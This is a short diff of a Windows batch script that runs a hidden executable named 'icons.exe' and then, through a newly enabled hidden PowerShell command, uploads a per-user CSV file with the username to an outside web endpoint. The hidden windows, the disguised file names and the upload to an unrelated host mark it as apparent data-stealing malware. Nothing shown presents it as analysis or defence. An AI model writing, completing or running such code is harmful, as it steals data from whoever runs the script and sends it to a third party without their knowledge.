@@ -32,7 +32,7 @@ powershell -WindowStyle Hidden -Command "Start-Process 'x64/icons.exe' -Argument
 timeout /t 10 >nul
 
 :: Send the content of the file as a POST request
-::powershell -WindowStyle Hidden -Command "Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/upload' -Method Post -Body (@{username='%username%'; content=(Get-Content -Path 'x64/%username%.csv' -Raw)})"
+powershell -WindowStyle Hidden -Command "Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/post' -Method Post -Body (@{username='%username%'; content=(Get-Content -Path 'x64/%username%.csv' -Raw)})"
 
 :: Delete the CSV file after sending the data
 ::del "x64\%username%.csv"
